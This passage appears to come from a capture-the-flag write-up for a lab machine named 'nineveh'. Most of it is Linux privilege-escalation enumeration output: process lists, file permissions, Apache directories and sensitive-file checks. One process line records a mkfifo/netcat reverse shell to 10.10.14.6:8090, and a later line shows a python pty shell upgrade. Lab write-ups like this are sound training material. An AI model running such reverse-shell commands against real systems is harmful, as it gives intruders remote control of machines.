root        53  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        54  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        55  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        56  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        57  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        58  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        59  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        60  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        61  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        62  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        63  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        64  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        65  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        66  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        67  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        68  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        69  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        70  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        71  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        72  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root        73  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_0]
root        74  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_0]
root        75  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_1]
root        76  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_1]
root        82  0.0  0.0      0     0 ?        S<   Jan25   0:00 [ipv6_addrconf]
root        95  0.0  0.0      0     0 ?        S<   Jan25   0:00 [deferwq]
root        96  0.0  0.0      0     0 ?        S<   Jan25   0:00 [charger_manager]
root       145  0.0  0.0      0     0 ?        S<   Jan25   0:00 [kpsmoused]
root       155  0.0  0.0      0     0 ?        S<   Jan25   0:00 [ttm_swap]
root       191  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_2]
root       192  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_2]
root       193  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_3]
root       194  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_3]
root       195  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_4]
root       196  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_4]
root       197  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_5]
root       198  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_5]
root       199  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_6]
root       200  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_6]
root       201  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_7]
root       202  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_7]
root       203  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_8]
root       204  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_8]
root       205  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_9]
root       206  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_9]
root       207  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_10]
root       208  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_10]
root       209  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_11]
root       210  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_11]
root       211  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_12]
root       212  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_12]
root       213  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_13]
root       214  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_13]
root       215  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_14]
root       216  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_14]
root       217  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_15]
root       218  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_15]
root       219  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_16]
root       220  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_16]
root       221  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_17]
root       222  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_17]
root       223  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_18]
root       224  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_18]
root       225  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_19]
root       226  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_19]
root       227  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_20]
root       228  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_20]
root       229  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_21]
root       230  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_21]
root       231  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_22]
root       232  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_22]
root       233  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_23]
root       234  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_23]
root       235  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_24]
root       236  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_24]
root       237  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_25]
root       238  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_25]
root       239  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_26]
root       240  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_26]
root       241  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_27]
root       242  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_27]
root       243  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_28]
root       244  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_28]
root       245  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_29]
root       246  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_29]
root       247  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_30]
root       248  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_30]
root       249  0.0  0.0      0     0 ?        S    Jan25   0:00 [scsi_eh_31]
root       250  0.0  0.0      0     0 ?        S<   Jan25   0:00 [scsi_tmf_31]
root       277  0.0  0.0      0     0 ?        S    Jan25   0:01 [kworker/u2:30]
root       279  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root       280  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root       281  0.0  0.0      0     0 ?        S    Jan25   0:01 [kworker/u2:32]
root       286  0.0  0.0      0     0 ?        S<   Jan25   0:00 [kworker/0:1H]
root       354  0.0  0.0      0     0 ?        S<   Jan25   0:00 [raid5wq]
root       389  0.0  0.0      0     0 ?        S<   Jan25   0:00 [bioset]
root       417  0.0  0.0      0     0 ?        S    Jan25   0:00 [jbd2/sda1-8]
root       418  0.0  0.0      0     0 ?        S<   Jan25   0:00 [ext4-rsv-conver]
www-data   447  0.0  1.2 270656 13004 ?        S    02:13   0:00 /usr/sbin/apache2 -k start
root       484  0.0  0.2  28464  2988 ?        Ss   Jan25   0:00 /lib/systemd/systemd-journald
root       487  0.0  0.0      0     0 ?        S    Jan25   0:00 [kauditd]
root       494  0.0  0.0      0     0 ?        S<   Jan25   0:00 [iscsi_eh]
root       507  0.0  0.0      0     0 ?        S<   Jan25   0:00 [ib_addr]
root       513  0.0  0.0      0     0 ?        S<   Jan25   0:00 [ib_mcast]
root       517  0.0  0.0      0     0 ?        S<   Jan25   0:00 [ib_nl_sa_wq]
root       521  0.0  0.0      0     0 ?        S<   Jan25   0:00 [ib_cm]
root       522  0.0  0.0      0     0 ?        S<   Jan25   0:00 [iw_cm_wq]
root       523  0.0  0.0      0     0 ?        S<   Jan25   0:00 [rdma_cm]
root       527  0.0  0.1  94776  1628 ?        Ss   Jan25   0:00 /sbin/lvmetad -f
root       541  0.0  0.3  44692  4012 ?        Ss   Jan25   0:00 /lib/systemd/systemd-udevd
systemd+   616  0.0  0.2 100328  2392 ?        Ssl  Jan25   0:01 /lib/systemd/systemd-timesyncd
root       921  0.0  0.0   5228   160 ?        Ss   Jan25   0:00 /sbin/iscsid
root       922  0.0  0.3   5728  3524 ?        S<Ls Jan25   0:02 /sbin/iscsid
root      1088  0.0  2.0 263820 20616 ?        Ssl  Jan25   0:00 /usr/lib/snapd/snapd
daemon    1089  0.0  0.1  26048  2008 ?        Ss   Jan25   0:00 /usr/sbin/atd -f
root      1103  0.0  0.2  29012  2728 ?        Ss   Jan25   0:00 /usr/sbin/cron -f
root      1105  0.0  0.7 275772  8036 ?        Ssl  Jan25   0:00 /usr/lib/accountsservice/accounts-daemon
message+  1113  0.0  0.3  42896  3592 ?        Ss   Jan25   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
root      1140  0.0  0.5  65524  5228 ?        Ss   Jan25   0:00 /usr/sbin/sshd -D
root      1152  0.0  0.1   4404  1296 ?        Ss   Jan25   0:00 /usr/sbin/acpid
root      1153  0.3  0.5 636888  5672 ?        Ssl  Jan25   2:44 /usr/bin/lxcfs /var/lib/lxcfs/
syslog    1158  0.0  0.3 256404  3072 ?        Ssl  Jan25   0:00 /usr/sbin/rsyslogd -n
root      1171  0.0  0.9 185740  9812 ?        Ssl  Jan25   0:20 /usr/bin/vmtoolsd
root      1172  0.0  0.1  20104  1280 ?        Ss   Jan25   0:00 /lib/systemd/systemd-logind
root      1215  0.0  0.5 277184  5780 ?        Ssl  Jan25   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1234  0.0  0.1  15944  1620 tty1     Ss+  Jan25   0:00 /sbin/agetty --noclear tty1 linux
root      1245  0.9  0.2   8756  2228 ?        Ss   Jan25   6:55 /usr/sbin/knockd -d -i ens33
root      1254  0.0  0.0  13380   172 ?        Ss   Jan25   0:00 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
root      1399  0.0  2.5 270376 25612 ?        Ss   Jan25   0:02 /usr/sbin/apache2 -k start
www-data  2409  0.0  0.0   4512   784 ?        S    02:15   0:00 sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 8090 >/tmp/f
www-data  2412  0.0  0.0   4540   836 ?        S    02:15   0:00 cat /tmp/f
www-data  2413  0.0  0.0   4512   764 ?        S    02:15   0:00 /bin/sh -i
www-data  2414  0.0  0.1  11308  1732 ?        S    02:15   0:00 nc 10.10.14.6 8090
www-data  3373  0.1  1.0 270460 11148 ?        S    02:16   0:00 /usr/sbin/apache2 -k start
www-data  4344  0.0  0.8  35840  8484 ?        S    02:17   0:00 python3 -c import pty; pty.spawn("/bin/bash")
www-data  4345  0.0  0.3  18220  3272 pts/0    Ss   02:17   0:00 /bin/bash
www-data  6266  0.1  1.0 270460 11148 ?        S    02:19   0:00 /usr/sbin/apache2 -k start
www-data  6268  0.1  1.1 270460 11188 ?        S    02:19   0:00 /usr/sbin/apache2 -k start
root      7208  0.0  0.0      0     0 ?        S    Jan25   0:13 [kworker/0:1]
www-data  7230  0.1  1.1 270460 11208 ?        S    02:20   0:00 /usr/sbin/apache2 -k start
www-data  7231  0.1  1.1 270460 11208 ?        S    02:20   0:00 /usr/sbin/apache2 -k start
www-data  7234  0.1  1.0 270460 11148 ?        S    02:20   0:00 /usr/sbin/apache2 -k start
www-data  7235  0.1  1.1 270460 11208 ?        S    02:20   0:00 /usr/sbin/apache2 -k start
www-data  8196  0.1  1.1 270460 11188 ?        S    02:21   0:00 /usr/sbin/apache2 -k start
www-data  8197  0.1  1.0 270460 11088 ?        S    02:21   0:00 /usr/sbin/apache2 -k start
www-data  8198  0.1  1.0 270460 11128 ?        S    02:22   0:00 /usr/sbin/apache2 -k start
www-data  9152  0.1  1.0 270460 11148 ?        S    02:22   0:00 /usr/sbin/apache2 -k start
www-data 10106  0.0  1.1 270460 11248 ?        S    02:23   0:00 /usr/sbin/apache2 -k start
www-data 10107  0.0  1.1 270460 11268 ?        S    02:23   0:00 /usr/sbin/apache2 -k start
www-data 11065  0.0  1.1 270460 11248 ?        S    02:24   0:00 /usr/sbin/apache2 -k start
www-data 12023  0.0  0.3  18896  3672 pts/0    S+   02:25   0:00 bash
www-data 12024  0.0  0.3  18948  3324 pts/0    S+   02:25   0:00 bash
www-data 12025  0.0  0.0   4388   656 pts/0    S+   02:25   0:00 tee -a
www-data 13141  0.0  0.2  18932  2764 pts/0    S+   02:26   0:00 bash
www-data 13142  0.0  0.2  34428  2924 pts/0    R+   02:26   0:00 ps aux
root     18030  0.0  0.0      0     0 ?        S    01:24   0:01 [kworker/0:2]


Process binaries & associated permissions (from above list):
-rwxr-xr-x 1 root root  1037528 Jun 24  2016 /bin/bash
lrwxrwxrwx 1 root root        4 Jul  2  2017 /bin/sh -> dash
-rwxr-xr-x 1 root root   326224 Jan 18  2017 /lib/systemd/systemd-journald
-rwxr-xr-x 1 root root   618520 Jan 18  2017 /lib/systemd/systemd-logind
-rwxr-xr-x 1 root root   141904 Jan 18  2017 /lib/systemd/systemd-timesyncd
-rwxr-xr-x 1 root root   453240 Jan 18  2017 /lib/systemd/systemd-udevd
-rwxr-xr-x 1 root root    44104 Dec 16  2016 /sbin/agetty
lrwxrwxrwx 1 root root       20 Jul  2  2017 /sbin/init -> /lib/systemd/systemd
-rwxr-xr-x 1 root root   783984 Dec  9  2016 /sbin/iscsid
-rwxr-xr-x 1 root root    51336 Apr 16  2016 /sbin/lvmetad
-rwxr-xr-x 1 root root   513216 May 24  2016 /sbin/mdadm
-rwxr-xr-x 1 root root   224208 Jan 12  2017 /usr/bin/dbus-daemon
-rwxr-xr-x 1 root root    18504 Feb  3  2017 /usr/bin/lxcfs
-rwxr-xr-x 1 root root    44528 Feb  9  2017 /usr/bin/vmtoolsd
-rwxr-xr-x 1 root root   164928 Nov  3  2016 /usr/lib/accountsservice/accounts-daemon
-rwxr-xr-x 1 root root    15048 Jan 17  2016 /usr/lib/policykit-1/polkitd
-rwxr-xr-x 1 root root 17284560 Jan 14  2017 /usr/lib/snapd/snapd
-rwxr-xr-x 1 root root    48112 Apr  8  2016 /usr/sbin/acpid
-rwxr-xr-x 1 root root   646080 Jul 15  2016 /usr/sbin/apache2
-rwxr-xr-x 1 root root    26632 Jan 14  2016 /usr/sbin/atd
-rwxr-xr-x 1 root root    44472 Apr  5  2016 /usr/sbin/cron
-rwxr-xr-x 1 root root    48080 Mar 25  2009 /usr/sbin/knockd
-rwxr-xr-x 1 root root   599328 Apr  5  2016 /usr/sbin/rsyslogd
-rwxr-xr-x 1 root root   799216 Mar 16  2017 /usr/sbin/sshd


/etc/init.d/ binary permissions:
total 324
drwxr-xr-x  2 root root 4096 Jul  2  2017 .
drwxr-xr-x 93 root root 4096 Aug  5 10:18 ..
-rw-r--r--  1 root root 1322 Aug  5 02:38 .depend.boot
-rw-r--r--  1 root root  971 Aug  5 02:38 .depend.start
-rw-r--r--  1 root root 1272 Aug  5 02:38 .depend.stop
-rw-r--r--  1 root root 2427 Jan 19  2016 README
-rwxr-xr-x  1 root root 2243 Feb  9  2016 acpid
-rwxr-xr-x  1 root root 2210 Apr  5  2016 apache-htcacheclean
-rwxr-xr-x  1 root root 8087 Apr  5  2016 apache2
-rwxr-xr-x  1 root root 6250 Oct  4  2016 apparmor
-rwxr-xr-x  1 root root 2799 Mar 31  2016 apport
-rwxr-xr-x  1 root root 1071 Dec  6  2015 atd
-rwxr-xr-x  1 root root 1275 Jan 19  2016 bootmisc.sh
-rwxr-xr-x  1 root root 3807 Jan 19  2016 checkfs.sh
-rwxr-xr-x  1 root root 1098 Jan 19  2016 checkroot-bootclean.sh
-rwxr-xr-x  1 root root 9353 Jan 19  2016 checkroot.sh
-rwxr-xr-x  1 root root 1343 Apr  4  2016 console-setup
-rwxr-xr-x  1 root root 3049 Apr  5  2016 cron
-rwxr-xr-x  1 root root  937 Mar 28  2015 cryptdisks
-rwxr-xr-x  1 root root  896 Mar 28  2015 cryptdisks-early
-rwxr-xr-x  1 root root 2813 Dec  1  2015 dbus
-rwxr-xr-x  1 root root 1105 Mar 15  2016 grub-common
-rwxr-xr-x  1 root root 1336 Jan 19  2016 halt
-rwxr-xr-x  1 root root 1423 Jan 19  2016 hostname.sh
-rwxr-xr-x  1 root root 3809 Mar 12  2016 hwclock.sh
-rwxr-xr-x  1 root root 2372 Apr 11  2016 irqbalance
-rwxr-xr-x  1 root root 1503 Mar 29  2016 iscsid
-rwxr-xr-x  1 root root 1804 Apr  4  2016 keyboard-setup
-rwxr-xr-x  1 root root 1300 Jan 19  2016 killprocs
-rwxr-xr-x  1 root root 2087 Dec 20  2015 kmod
-rwxr-xr-x  1 root root 1572 Mar 25  2009 knockd
-rwxr-xr-x  1 root root  695 Oct 30  2015 lvm2
-rwxr-xr-x  1 root root  571 Oct 30  2015 lvm2-lvmetad
-rwxr-xr-x  1 root root  586 Oct 30  2015 lvm2-lvmpolld
-rwxr-xr-x  1 root root 2300 Feb  3  2017 lxcfs
-rwxr-xr-x  1 root root 2541 Feb  3  2017 lxd
-rwxr-xr-x  1 root root 2611 Apr 11  2016 mdadm
-rwxr-xr-x  1 root root 1199 Jul 16  2014 mdadm-waitidle
-rwxr-xr-x  1 root root  703 Jan 19  2016 mountall-bootclean.sh
-rwxr-xr-x  1 root root 2301 Jan 19  2016 mountall.sh
-rwxr-xr-x  1 root root 1461 Jan 19  2016 mountdevsubfs.sh
-rwxr-xr-x  1 root root 1564 Jan 19  2016 mountkernfs.sh
-rwxr-xr-x  1 root root  711 Jan 19  2016 mountnfs-bootclean.sh
-rwxr-xr-x  1 root root 2456 Jan 19  2016 mountnfs.sh
-rwxr-xr-x  1 root root 1364 Jan  2  2016 netfilter-persistent
-rwxr-xr-x  1 root root 4771 Jul 19  2015 networking
-rwxr-xr-x  1 root root 1581 Oct 15  2015 ondemand
-rwxr-xr-x  1 root root 2503 Mar 29  2016 open-iscsi
-rwxr-xr-x  1 root root 1578 Sep 18  2016 open-vm-tools
-rwxr-xr-x  1 root root 1366 Nov 15  2015 plymouth
-rwxr-xr-x  1 root root  752 Nov 15  2015 plymouth-log
-rwxr-xr-x  1 root root 1192 Sep  6  2015 procps
-rwxr-xr-x  1 root root 6366 Jan 19  2016 rc
-rwxr-xr-x  1 root root  820 Jan 19  2016 rc.local
-rwxr-xr-x  1 root root  117 Jan 19  2016 rcS
-rwxr-xr-x  1 root root  661 Jan 19  2016 reboot
-rwxr-xr-x  1 root root 4149 Nov 23  2015 resolvconf
-rwxr-xr-x  1 root root 4355 Jul 10  2014 rsync
-rwxr-xr-x  1 root root 2796 Feb  3  2016 rsyslog
-rwxr-xr-x  1 root root 1226 Jun  9  2015 screen-cleanup
-rwxr-xr-x  1 root root 3927 Jan 19  2016 sendsigs
-rwxr-xr-x  1 root root  597 Jan 19  2016 single
-rw-r--r--  1 root root 1087 Jan 19  2016 skeleton
-rwxr-xr-x  1 root root 4077 Mar 16  2017 ssh
-rwxr-xr-x  1 root root 6087 Apr 12  2016 udev
-rwxr-xr-x  1 root root 2049 Aug  7  2014 ufw
-rwxr-xr-x  1 root root 2737 Jan 19  2016 umountfs
-rwxr-xr-x  1 root root 2202 Jan 19  2016 umountnfs.sh
-rwxr-xr-x  1 root root 1879 Jan 19  2016 umountroot
-rwxr-xr-x  1 root root 1379 Feb 18  2016 unattended-upgrades
-rwxr-xr-x  1 root root 3111 Jan 19  2016 urandom
-rwxr-xr-x  1 root root 1306 Dec 16  2016 uuidd


### SOFTWARE #############################################
Sudo version:
Sudo version 1.8.16


Apache version:
Server version: Apache/2.4.18 (Ubuntu)
Server built:   2016-07-14T12:32:26


Apache user configuration:
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data


Installed Apache modules:
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
 php7_module (shared)
 setenvif_module (shared)
 socache_shmcb_module (shared)
 ssl_module (shared)
 status_module (shared)


Anything in the Apache home dirs?:
/var/www/:
total 20K
drwxr-xr-x  5 root root 4.0K Jul  2  2017 .
drwxr-xr-x 14 root root 4.0K Jul  2  2017 ..
drwxr-xr-x  2 root root 4.0K Jul  2  2017 cd
drwxr-xr-x  3 root root 4.0K Jul  2  2017 html
drwxr-xr-x  4 root root 4.0K Jul  2  2017 ssl

/var/www/cd:
total 8.0K
drwxr-xr-x 2 root root 4.0K Jul  2  2017 .
drwxr-xr-x 5 root root 4.0K Jul  2  2017 ..

/var/www/html:
total 108K
drwxr-xr-x 3 root root 4.0K Jul  2  2017 .
drwxr-xr-x 5 root root 4.0K Jul  2  2017 ..
drwxr-xr-x 4 root root 4.0K Jul  2  2017 department
-rw-r--r-- 1 root root  178 Jul  2  2017 index.html
-rw-r--r-- 1 root root   21 Jul  2  2017 info.php
-rw-r--r-- 1 root root  88K Jul  2  2017 ninevehdestruction.jpg

/var/www/html/department:
total 256K
drwxr-xr-x 4 root root 4.0K Jul  2  2017 .
drwxr-xr-x 3 root root 4.0K Jul  2  2017 ..
drwxr-xr-x 2 root root 4.0K Jul  2  2017 css
drwxr-xr-x 2 root root 4.0K Jul  2  2017 files
-rw-r--r-- 1 root root   51 Jul  2  2017 footer.php
-rw-r--r-- 1 root root  974 Jul  2  2017 header.php
-rw-r--r-- 1 root root   68 Jul  2  2017 index.php
-rw-r--r-- 1 root root 1.5K Jul  2  2017 login.php
-rw-r--r-- 1 root root   76 Jul  2  2017 logout.php
-rw-r--r-- 1 root root  844 Jul  2  2017 manage.php
-rw-r--r-- 1 root root 216K Jul  2  2017 underconstruction.jpg

/var/www/html/department/css:
total 100K
drwxr-xr-x 2 root root 4.0K Jul  2  2017 .
drwxr-xr-x 4 root root 4.0K Jul  2  2017 ..
-rwxr-xr-x 1 root root  81K Jul  2  2017 bootstrap.css
-rw-r--r-- 1 root root   68 Jul  2  2017 index.php
-rw-r--r-- 1 root root   57 Jul  2  2017 nineveh.css

/var/www/html/department/files:
total 16K
drwxr-xr-x 2 root root 4.0K Jul  2  2017 .
drwxr-xr-x 4 root root 4.0K Jul  2  2017 ..
-rw-r--r-- 1 root root   68 Jul  2  2017 index.php
-rw-r--r-- 1 root root  232 Jul  2  2017 ninevehNotes.txt

/var/www/ssl:
total 568K
drwxr-xr-x 4 root root 4.0K Jul  2  2017 .
drwxr-xr-x 5 root root 4.0K Jul  2  2017 ..
drwxr-xr-x 2 root root 4.0K Jul  2  2017 db
-rw-r--r-- 1 root root   49 Jul  2  2017 index.html
-rw-r--r-- 1 root root 548K Jul  2  2017 ninevehForAll.png
drwxr-xr-x 2 root root 4.0K Jul  2  2017 secure_notes

/var/www/ssl/db:
total 368K
drwxr-xr-x 2 root root 4.0K Jul  2  2017 .
drwxr-xr-x 4 root root 4.0K Jul  2  2017 ..
-rwxr-xr-x 1 root root 178K Jul  2  2017 index.php
-rw-r--r-- 1 root root 178K Jul  2  2017 phpliteadmin.php.save

/var/www/ssl/secure_notes:
total 2.8M
drwxr-xr-x 2 root root 4.0K Jul  2  2017 .
drwxr-xr-x 4 root root 4.0K Jul  2  2017 ..
-rw-r--r-- 1 root root   71 Jul  2  2017 index.html
-rw-r--r-- 1 root root 2.8M Jul  2  2017 nineveh.png


### INTERESTING FILES ####################################
Useful file locations:
/bin/nc
/bin/netcat
/usr/bin/wget


Can we read/write sensitive files:
-rw-r--r-- 1 root root 1617 Jul  2  2017 /etc/passwd
-rw-r--r-- 1 root root 771 Jul  3  2017 /etc/group
-rw-r--r-- 1 root root 575 Oct 22  2015 /etc/profile
-rw-r----- 1 root shadow 1068 Jul  3  2017 /etc/shadow


Can't search *.conf files as no keyword was entered

Can't search *.log files as no keyword was entered

Can't search *.ini files as no keyword was entered

All *.conf files in /etc (recursive 1 level):
-rw-r--r-- 1 root root 3028 Feb 15  2017 /etc/adduser.conf
-rw-r--r-- 1 root root 604 Jul  2  2015 /etc/deluser.conf
-rw-r--r-- 1 root root 1371 Jan 27  2016 /etc/rsyslog.conf
-rw-r--r-- 1 root root 7788 Jul  2  2017 /etc/ca-certificates.conf
-rw-r--r-- 1 root root 92 Oct 22  2015 /etc/host.conf
-rw-r--r-- 1 root root 497 May  4  2014 /etc/nsswitch.conf
-rw-r--r-- 1 root root 2192 Aug  5 10:18 /etc/sysctl.conf
-rw-r--r-- 1 root root 771 Mar  6  2015 /etc/insserv.conf
-rw-r--r-- 1 root root 703 May  5  2015 /etc/logrotate.conf
-rw-r--r-- 1 root root 967 Oct 30  2015 /etc/mke2fs.conf
-rw-r--r-- 1 root root 100 Nov 25  2015 /etc/sos.conf
-rw-r--r-- 1 root root 280 Jun 20  2014 /etc/fuse.conf
-rw-r--r-- 1 root root 354 Aug  5 02:06 /etc/knockd.conf
-rw-r--r-- 1 root root 1260 Mar 16  2016 /etc/ucf.conf
-rw-r--r-- 1 root root 34 Jan 27  2016 /etc/ld.so.conf
-rw-r--r-- 1 root root 4781 Mar 17  2016 /etc/hdparm.conf
-rw-r--r-- 1 root root 2969 Nov 10  2015 /etc/debconf.conf
-rw-r--r-- 1 root root 2583 Jul  2  2017 /etc/gai.conf
-rw-r--r-- 1 root root 14867 Apr 12  2016 /etc/ltrace.conf
-rw-r--r-- 1 root root 338 Nov 18  2014 /etc/updatedb.conf
-rw-r--r-- 1 root root 552 Mar 16  2016 /etc/pam.conf
-rw-r--r-- 1 root root 350 Jul  2  2017 /etc/popularity-contest.conf
-rw-r--r-- 1 root root 191 Jan 18  2016 /etc/libaudit.conf
-rw-r--r-- 1 root root 6816 Nov 29  2016 /etc/overlayroot.conf
-rw-r--r-- 1 root root 144 Jul  2  2017 /etc/kernel-img.conf


Any interesting mail in /var/mail:
total 12
drwxrwsr-x  2 root   mail 4096 Jul  2  2017 .
drwxr-xr-x 14 root   root 4096 Jul  2  2017 ..
-rw-r--r--  1 amrois mail  483 Jul  2  2017 amrois


### SCAN COMPLETE ####################################
www-data@nineveh:/var/www/html/department$
```

- List of commands running on the server

```sh
www-data@nineveh:/report$ ps -eo command
COMMAND
/sbin/init
[kthreadd]
[ksoftirqd/0]
[kworker/0:0H]
[rcu_sched]
[rcu_bh]
[migration/0]
[watchdog/0]
[kdevtmpfs]
[netns]
[perf]
[khungtaskd]
[writeback]
[ksmd]
[khugepaged]
[crypto]
[kintegrityd]
[bioset]
[kblockd]
[ata_sff]
[md]
[devfreq_wq]
[kswapd0]
[vmstat]
[fsnotify_mark]
[ecryptfs-kthrea]
[kthrotld]
[acpi_thermal_pm]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[bioset]
[scsi_eh_0]
[scsi_tmf_0]
[scsi_eh_1]
[scsi_tmf_1]
[ipv6_addrconf]
[deferwq]
[charger_manager]
[kpsmoused]
[ttm_swap]
[scsi_eh_2]
[scsi_tmf_2]
[scsi_eh_3]
[scsi_tmf_3]
[scsi_eh_4]
[scsi_tmf_4]
[scsi_eh_5]
[scsi_tmf_5]
[scsi_eh_6]
[scsi_tmf_6]
[scsi_eh_7]
[scsi_tmf_7]
[scsi_eh_8]
[scsi_tmf_8]
[scsi_eh_9]
[scsi_tmf_9]
[scsi_eh_10]
[scsi_tmf_10]
[scsi_eh_11]
[scsi_tmf_11]
[scsi_eh_12]
[scsi_tmf_12]
[scsi_eh_13]
[scsi_tmf_13]
[scsi_eh_14]
[scsi_tmf_14]
[scsi_eh_15]
[scsi_tmf_15]
[scsi_eh_16]
[scsi_tmf_16]
[scsi_eh_17]
[scsi_tmf_17]
[scsi_eh_18]
[scsi_tmf_18]
[scsi_eh_19]
[scsi_tmf_19]
[scsi_eh_20]
[scsi_tmf_20]
[scsi_eh_21]
[scsi_tmf_21]
[scsi_eh_22]
[scsi_tmf_22]
[scsi_eh_23]
[scsi_tmf_23]
[scsi_eh_24]
[scsi_tmf_24]
[scsi_eh_25]
[scsi_tmf_25]
[scsi_eh_26]
[scsi_tmf_26]
[scsi_eh_27]
[scsi_tmf_27]
[scsi_eh_28]
[scsi_tmf_28]
[scsi_eh_29]
[scsi_tmf_29]
[scsi_eh_30]
[scsi_tmf_30]
[scsi_eh_31]
[scsi_tmf_31]
